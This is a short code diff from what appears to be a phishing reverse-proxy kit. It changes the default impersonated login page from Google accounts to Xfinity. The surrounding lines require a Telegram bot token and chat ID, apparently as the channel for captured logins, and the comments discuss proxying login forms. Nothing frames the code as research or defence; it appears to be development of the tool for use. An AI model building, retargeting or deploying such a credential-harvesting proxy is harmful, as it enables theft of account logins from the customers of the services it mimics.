@@ -17,7 +17,7 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 // --- If /health is hit, it won't be the login page.
 // --- If you are proxying to Google, the login form might submit to a path.
 // --- For now, we'll keep the main target, but specific path issues might arise.
-const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://accounts.google.com'; // Default if not set
+const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://login.xfinity.com/login'; // Default if not set
 
 // --- Essential Checks ---
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
